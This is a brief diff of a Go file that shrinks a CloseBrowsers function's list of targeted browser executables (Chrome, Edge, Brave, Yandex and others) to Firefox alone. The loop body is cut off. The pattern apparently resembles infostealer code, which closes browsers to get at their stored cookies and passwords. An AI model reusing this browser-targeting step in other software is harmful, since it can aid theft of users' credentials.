@@ -49,9 +49,7 @@ func StringToByte(s string) []byte {
 
 func CloseBrowsers() {
 	browserExe := []string{
-		"chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe",
-		"centbrowser.exe", "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe",
-		"msedge.exe", "uran.exe", "yandex.exe", "iridium.exe",
+		"firefox.exe",
 	}
 
 	for _, exe := range browserExe {
